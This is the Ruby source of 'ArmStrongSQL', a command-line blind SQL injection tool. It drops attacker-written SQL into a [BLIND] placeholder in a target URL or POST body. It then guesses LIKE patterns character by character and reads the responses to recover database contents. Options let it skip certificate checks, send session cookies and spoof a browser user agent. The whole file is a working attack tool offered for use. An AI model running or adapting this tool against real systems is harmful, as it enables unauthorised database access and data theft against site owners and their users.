#!/usr/bin/env ruby
require "net/http"
require "net/https"
require "erb"
require "singleton"
require 'uri'
require 'optparse'

puts '                           _____ _                            _____    ____    _      '
puts '     /\                   / ____| |                          / ____|  / __ \  | |     '
puts '    /  \   _ __ _ __ ___ | (___ | |_ _ __ ___  _ __   __ _  | (___   | |  | | | |     '
puts '   / /\ \ | \'__| \'_ ` _ \ \___ \| __| \'__/ _ \| \'_ \ / _` |  \___ \  | |  | | | |     '
puts '  / ____ \| |  | | | | | |____) | |_| | | (_) | | | | (_| |  ____) | | |__| | | |____ '
puts ' /_/    \_\_|  |_| |_| |_|_____/ \__|_|  \___/|_| |_|\__, | |_____/   \___\_\ |______|'
puts '                                                      __/ |                           '
puts '                                                     |___/                            '
puts ' v1.0'

@qt_interacaoes = 0

Options = Struct.new(:name, :verbose, :string_math, :sql, :prefix, :suffix, :dic, :wildcard, :recursive, :url, :post, :cookie, :ignore_cert, :ofile_name, :ifile_name)

class Parser
  def self.parse(options)
    args = Options.new("world")
    args.verbose = false
    args.string_math = ""
    args.prefix = ""
    args.suffix = ""
    args.dic = "all"
    args.wildcard = false
    args.recursive = false
    args.url = ""
    args.post = ""
    args.cookie = ""
    args.ignore_cert = false
    args.ofile_name = ""
    args.ifile_name = ""

    opt_parser = OptionParser.new do |opts|
      opts.banner = "Usage: ./ArmStrongSQL.rb -m \"SUCESS\" -u \"http://example.com/?[BLIND]\" -s \"SELECT count(*) FROM <TABLE> WHRE COL like '%'\" [options]"


      opts.on("-mNAME", "--string_math=NAME", "String for true condition") do |n|
        args.string_math = n         
      end


      opts.on("-sSQL", "--sql=SQL", "Query SQL") do |n|
        args.sql = n         
      end

      opts.on("-uURL", "--url=URL", "Target Url") do |n|
        args.url = n         
      end

 
      opts.on("-pPREFIX", "--prefix=PREFIX", "Prefix to limit like") do |n|
        args.prefix = n
      end

      opts.on( "--post=DATA", "POST Value") do |n|
        args.post = n
      end

      opts.on( "--cookie=COOKIE", "Cookie") do |n|
        args.cookie = n
      end
      opts.on( "--suffix=SUFFIX", "Suffix to limit like") do |n|
        args.suffix = n
      end

      opts.on( "--dic=DICTIONARY", "alpha=[A-Z], all=[1-9A-Z],hex = [1-9A-E] or num=[0-9]. Ex.: --dic hex ") do |n|
        args.dic = n
      end

      opts.on("-r", "--recursive", "Do the recursive search. Without this flag brings only one line.") do |n|
       args.recursive = true
      end

      opts.on("-w", "--wildcard", "Use wildcard in '_' like") do |n|
       args.wildcard = true
      end

      opts.on("-oFILENAME", "--output-file=FILENAME", "Write result to FILENAME") do |n|
       args.ofile_name = n
      end

      opts.on("-iFILENAME", "--input-file=FILENAME", "Loca payload in FILENAME [FILE]") do |n|
       args.ifile_name = n
      end

      opts.on("-b", "--bypass-cert", "Ignore certificate") do |n|
       args.ignore_cert = true
      end

      opts.on("-v", "--verbose", "Verbose") do |n|
       args.verbose = true
      end
 

      opts.on("-h", "--help", "Prints this help") do
        puts opts
        exit
      end
    end

    opt_parser.parse!(options)
    return args
  end
end
@options = Parser.parse(ARGV)

if( @options.string_math === "" || @options.url == "")
    Parser.parse %w[--help]
end

@array_dic = Array.new
@array_file = Array.new
if( @options.dic === "all" || @options.dic === "num" || @options.dic === "hex" )
    for i in 48..57
       @array_dic.push i.chr
    end
end


if( @options.dic === "hex" )
    for i in 65..70
       @array_dic.push i.chr
    end
end

if( @options.dic === "all" || @options.dic === "alpha" )
    for i in 65..90
       @array_dic.push i.chr
    end
end

if( @options.wildcard )
    @array_dic.push "_"
end
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

def requisicao(pad)
    @qt_interacaoes = @qt_interacaoes+1;
	useragent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1'
    uri = URI(@options.url)
	@http = Net::HTTP.new(uri.host, uri.port)
    if uri.scheme === 'https'
        @http.use_ssl = true
        if @options.ignore_cert
            @http.verify_mode = OpenSSL::SSL::VERIFY_NONE
        end
    end

    param_file = ""
    if @array_file.length > 0
        param_file = @array_file[@array_file.length-1]      
    end

    sql = @options.sql
    sql = sql.gsub "'%'","'#{@options.prefix}#{pad}%#{@options.suffix}'"
    sql = sql.gsub "[FILE]", param_file
    verbose( sql )
    sql_uri  = URI.escape(sql, Regexp.new("[^#{URI::PATTERN::UNRESERVED}]"))    
    query = "" 
   
    if(uri.query != "")
        query = "?#{uri.query}"        
        query = query.gsub "[BLIND]", sql_uri
    end

		@headers = {
				    'Content-Type' => 'application/json',
                    'accept' => 'application/json, text/plain, */*',
                    'Host' => uri.host,
                    'Connection' => 'close',
                    'Accept-Encoding' => 'gzip, deflate',
				    'User-Agent' => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1 ArmStrongSQL"
		}

        if @options.cookie != ""
            cookie = { 'Cookie' => @options.cookie }
            @headers.merge!(cookie)
        end 
    
    if @options.post === ""
        resp = @http.get2("#{uri.path}#{query}", @headers)
    else
        data = @options.post
        data = data.gsub "[BLIND]", sql_uri
        resp = @http.post2("#{uri.path}#{query}", data, @headers)
    end 
   
    resultado = /#{@options.string_math}/.match(resp.body)  
   	if resultado.nil?
		return false
	else
		return true
	end
end

@array_return = Array.new

def appendArray()
    @array_return.push Array.new()
    @finalizou = false
end

def print_result(final=false)
    if final
        puts " "
        puts "-= FINAL RESULT =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
        puts " Number of request: #{@qt_interacaoes}" 
        puts "----------------------------------------------------------------------------------------------------"
        
        for n in 0..@array_return.length-1
           puts "#{@options.prefix}"+@array_return[n].join+"#{@options.suffix}"
        end
        puts "----------------------------------------------------------------------------------------------------"
        puts " "
    else
        if !@finalizou
            puts "-=PARTIAL [QTR:#{@qt_interacaoes}]: #{@options.prefix}"+@array_return[@array_return.length-1].join+"#{@options.suffix}"
            if @options.ofile_name != ""
                open(@options.ofile_name, 'a') { |f|
                  f.puts "#{@options.prefix}"+@array_return[@array_return.length-1].join+"#{@options.suffix}"
                }
            end
        end 
        @finalizou = true
    end
end

def verbose(val)
  if ( @options.verbose )
    puts "DEBUG: #{val}"
  end
end
@interacao = 0
@finalizou = false
def procuraProximo(pos,indice)
   qt_col = 0
    @interacao = @interacao + 1
    internal = @interacao
    for n in 0..@array_dic.length-1
        prefix = ""        
        if( internal > 1)
            prefix = @array_return[pos][0..indice-2].join
        end      
        if (requisicao( prefix + @array_dic[n] ))   
             if ( @options.recursive )
                verbose( "--> Recursive" )
                if @finalizou
                   appendArray()  
                   verbose(" appendArray" )
                   if( internal > 1)
                     @array_return[@array_return.length-1] = @array_return[pos][0..indice-2]
                   end
                   @array_return[@array_return.length-1].push @array_dic[n]
                   verbose( @array_return.inspect )
                   #exit
                   procuraProximo(@array_return.length-1, indice+1)
                else
                    @array_return[pos].push @array_dic[n]
                    procuraProximo(@array_return.length-1, indice+1)     
                    #qt_col = qt_col + 1
                    #break
                end
            else
                verbose( "--> NO Recursive "+@array_dic[n] )
                @array_return[pos][indice-1] = @array_dic[n]
                procuraProximo(@array_return.length-1, indice+1)
                break
            end
            verbose( @array_return.inspect )           
        end         
    end    
    if ( @options.recursive )
        if ( qt_col > 0 )  
        #  procuraProximo(pos,indice+1)
        else
          print_result()
        end
        
    else
        if @array_file.length > 0
            @array_return[@array_return.length-1].push ":"
            @array_return[@array_return.length-1].push @array_file[@array_file.length-1]
            print_result()
            @array_file.pop
            appendArray()
            procuraProximo(@array_return.length-1,1)            
        else    
          print_result(true) 
          exit
        end
    end
end

if @options.ofile_name != ""
    open(@options.ofile_name, 'w') { |f|
      f.putc ""
    }
end

if @options.ifile_name != ""
    file = File.open(@options.ifile_name)
    @array_file = file.readlines.map(&:chomp)
end

appendArray()
procuraProximo(0,1)
print_result(true)




